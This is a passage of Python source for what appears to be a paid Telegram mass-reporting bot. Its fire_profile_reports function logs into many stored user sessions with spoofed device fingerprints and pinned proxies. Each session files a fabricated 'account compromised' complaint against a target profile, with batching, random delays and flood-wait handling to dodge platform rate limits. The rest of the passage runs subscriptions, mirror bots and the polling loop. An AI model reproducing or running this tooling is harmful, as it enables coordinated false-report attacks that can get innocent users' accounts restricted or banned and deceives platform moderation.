# sessions ride our fingerprints, sticky proxies, locks and ledger rationing.
PROFILE_REPORT_TEXT = ("My account has been compromised. Please terminate "
                       "all active sessions immediately to protect my data.")
PROFILE_BATCH = 3


async def _profile_find_option(client, peer, keyword_ru: str,
                               keyword_en: str, prev: bytes = b''):
    from telethon.tl.functions.messages import ReportRequest
    try:
        r = await client(ReportRequest(peer=peer, id=[], option=prev,
                                       message=''))
        opts = getattr(r, "options", None) or []
        if not opts:
            return None
        for opt in opts:
            txt = (getattr(opt, "text", "") or "").lower()
            if keyword_ru in txt or keyword_en in txt:
                return opt.option
        return opts[-1].option
    except Exception:
        return None


async def _profile_options(client, target: str):
    """Scout the category tree once; returns (other_opt, misc_opt)."""
    entity = await client.get_entity(target)
    peer = await client.get_input_entity(entity)
    other = await _profile_find_option(client, peer, "другое", "other")
    if other is None:
        return None, None
    misc = await _profile_find_option(client, peer, "прочее", "misc", other)
    return other, misc


async def fire_profile_reports(target: str, comment: str = "") -> dict:
    """Profile complaint: 3-step option probe + final text, ONE per session."""
    from telethon.errors import FloodWaitError
    from telethon.tl.functions.messages import ReportRequest

    ledger = _ledger_load()
    sessions = []
    skipped = []
    for s in load_sessions():
        if s.stem in REPORT_EXCLUDE_POOL:
            continue
        ok, why = session_usable(s.stem, ledger)
        (sessions if ok else skipped).append((s, why))
    pool = [s for s, _ in sessions]
    proxies = load_pin_proxies()
    results = {"ok": 0, "fail": 0, "total": len(pool), "details": []}
    if not pool:
        await push_send_log("Report (профиль)", ["❌ нет доступных сессий"])
        return results

    # one scout on a usable session — options are the same for all sessions
    scout = pool[0]
    other = misc = None
    try:
        async with _session_lock(scout):
            fp = session_fingerprint(scout.stem)
            client = TelegramClient(
                str(scout.with_suffix("")), fp["api_id"], fp["api_hash"],
                proxy=pin_for_session(scout.stem, proxies),
                device_model=fp["device"], system_version=fp["system_version"],
                app_version=fp["app_version"], lang_code=fp["lang_code"])
            try:
                await _connect_safe(client)
                if not await client.is_user_authorized():
                    raise RuntimeError("scout not authorized")
                other, misc = await _profile_options(client, target)
            finally:
                await client.disconnect()
    except Exception as e:
        log.warning("profile scout failed: %s", e)
    if other is None:
        await push_send_log("Report (профиль)", [
            f"🎯 <code>{html_mod.escape(str(target))}</code>",
            "❌ дерево категорий не получено — отправка не выполнена"])
        return {"ok": 0, "fail": len(pool), "total": len(pool),
                "details": [{"name": s.stem, "proxy": "direct", "ok": False,
                             "err": "option scout failed"} for s in pool]}

    async def one(sess: Path):
        name = sess.stem
        proxy = pin_for_session(name, proxies)
        px = proxy[1] if proxy else "direct"
        try:
            async with _session_lock(sess):
                fp = session_fingerprint(name)
                client = TelegramClient(
                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
                    proxy=proxy, device_model=fp["device"],
                    system_version=fp["system_version"],
                    app_version=fp["app_version"], lang_code=fp["lang_code"])
                try:
                    await _connect_safe(client)
                    if not await client.is_user_authorized():
                        return name, px, False, "not authorized"
                    entity = await client.get_entity(target)
                    peer = await client.get_input_entity(entity)
                    await client(ReportRequest(
                        peer=peer, id=[], option=b'', message=''))
                    await client(ReportRequest(
                        peer=peer, id=[], option=other, message=''))
                    if misc and misc != other:
                        await client(ReportRequest(
                            peer=peer, id=[], option=misc, message=''))
                    await client(ReportRequest(
                        peer=peer, id=[], option=misc or other,
                        message=PROFILE_REPORT_TEXT))
                    _ledger_bump(name)
                    return name, px, True, ""
                finally:
                    await client.disconnect()
        except FloodWaitError as e:
            _session_punish(name, str(e), "flood")
            return name, px, False, f"flood_{e.seconds}s"
        except Exception as e:
            verdict = _classify_report_error(e)
            if verdict == "dead":
                _session_punish(name, str(e), "dead")
            elif verdict == "flood":
                _session_punish(name, str(e), "flood")
            return name, px, False, f"{type(e).__name__}: {e}"

    outs = []
    for i in range(0, len(pool), PROFILE_BATCH):
        outs += await asyncio.gather(*[one(s) for s in pool[i:i + PROFILE_BATCH]])
        if i + PROFILE_BATCH < len(pool):
            await asyncio.sleep(random.uniform(2, 4))

    real_rows = []
    for name, px, ok, err in outs:
        results["ok" if ok else "fail"] += 1
        results["details"].append({"name": name, "proxy": px,
                                   "ok": ok, "err": err})
        line = ("✅ " if ok else "❌ ") + html_mod.escape(name) + " | " + px
        if err:
            line += " | " + html_mod.escape(err)
        real_rows.append(line)
    for s, why in skipped:
        real_rows.append(f"⏭ {html_mod.escape(s.stem)} — {why}")
    await push_send_log("Report (профиль)", [
        f"🎯 <code>{html_mod.escape(str(target))}</code>",
        f"✉️ {results['ok']}/{results['total']} доставлено · "
        "Другое → Прочее → текст"]
        + real_rows)
    return results


# Stateless fallbacks: if an inline button arrives with a stale/missing FSM
# state, route it by callback_data instead of silently ignoring the press.
@router.callback_query(F.data.startswith("tier:"))
async def fb_tier(cb: CallbackQuery, state: FSMContext):
    await state.set_state(Report.tier)
    await got_tier(cb, state)


@router.callback_query(F.data.startswith("method:"))
async def fb_method(cb: CallbackQuery, state: FSMContext):
    await state.set_state(Report.method)
    await got_method(cb, state)


@router.callback_query(F.data.startswith("confirm:"))
async def fb_confirm(cb: CallbackQuery, state: FSMContext):
    if not (await state.get_data()).get("target"):
        await cb.answer("Нажми «Запуск» заново", show_alert=True)
        return
    await state.set_state(Report.confirm)
    await got_confirm(cb, state)


async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN missing")
        return
    if ARCH_CASHIER:
        await cashier_main()
        return
    dp = Dispatcher(storage=PersistStorage())
    globals()["_DP"] = dp
    dp.include_router(router)
    # ── maintenance gate: boss only, everyone else gets the notice ──────
    dp.update.outer_middleware(_make_maintenance_gate())
    n = len(load_sessions())
    p = len(load_proxies())
    log.info("%s starting... sessions=%d proxies=%d paid=%d",
             NAME, n, p, len(load_paid_proxies()))


    # paid static proxies are the pin pool now \u2014 the free farm stays FROZEN
    # (proxies.txt kept as fallback; harvesting only via method-test.yml)
    log.info("paid proxies: %d | free fallback: %d",
             len(load_paid_proxies()), len(load_proxies()))

    # mirror sub-bots: restart any previously-registered mirrors before main polling
    try:
        from mirror import _mirror_store, start_mirror
        mstore = _mirror_store()
        for tok, vminfo in mstore.items():
            try:
                start_mirror(tok)
            except Exception as e:
                log.warning("mirror %s failed to start: %s", vminfo.get("username"), e)
        n_mirrors = sum(1 for v in mstore.values())
        if n_mirrors:
            log.info("mirrors started: %d", n_mirrors)
    except Exception as e:
        log.warning("mirror submodule unavailable: %s", e)

    # retry the whole polling loop on network hiccups
    global _BOT, _BOT_STARTED
    _BOT_STARTED = time.time()
    while True:
        bot = Bot(token=BOT_TOKEN)
        _BOT = bot
        try:
            # canonical data store: users/subs restored from Telegram
            store.init(bot, BOT_TOKEN)
            await store.bootstrap({"users": USERS_FILE, "subs": SUBS_FILE})
            if not globals().get("_db_rec_started"):
                globals()["_db_rec_started"] = True
                asyncio.create_task(db_reconcile_loop())
            if not globals().get("_ct_poller_started"):
                globals()["_ct_poller_started"] = True
                asyncio.create_task(ct_poller_loop(bot))
            if not globals().get("_hb_started"):
                globals()["_hb_started"] = True
                logging.getLogger().addHandler(_ErrCounter())
                asyncio.create_task(hb_loop(bot))
            if not globals().get("_watch_started"):
                globals()["_watch_started"] = True
                asyncio.create_task(watch_loop())
            if not globals().get("_transplant_started"):
                globals()["_transplant_started"] = True
                asyncio.create_task(transplant_loop())
            if not globals().get("_stars_started"):
                globals()["_stars_started"] = True
                asyncio.create_task(star_tx_grant_loop())
            # one-time bridge: v32-era flow states live in the store
            # doc; the carrier is the repo file now — pull the doc
            # (read-only fetch, no chat writes) when the file is missing
            # or holds no entries
            try:
                _need = True
                try:
                    if FSM_FILE.exists():
                        _need = not json.loads(
                            FSM_FILE.read_text(encoding="utf-8")
                        ).get("entries")
                except Exception:
                    _need = True
                _txt = ""
                if _need:
                    _fid = (store._INDEX.get("fsm") or {}).get("file_id")
                    if _fid:
                        _txt = await store._tg_read("fsm", _fid) or ""
                if _txt:
                            FSM_FILE.write_text(_txt, encoding="utf-8")
                            commit_file_to_repo("fsm_state.json",
                                                "fsm restore from doc",
                                                cooldown=0)
                            log.info("fsm: bridged flow states from store doc")
            except Exception as e:
                log.warning("fsm bridge failed: %s", e)
            fsm_restore(bot)
            await dp.start_polling(bot)
            break
        except TelegramNetworkError as e:
            log.error("network down: %s — retrying in 5s", e)
            try:
                await bot.session.close()
            except Exception:
                pass
            await asyncio.sleep(5)
        except Exception as e:
            log.error("polling crashed: %s — retrying in 5s", e)
            try:
                await bot.session.close()
            except Exception:
                pass
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())
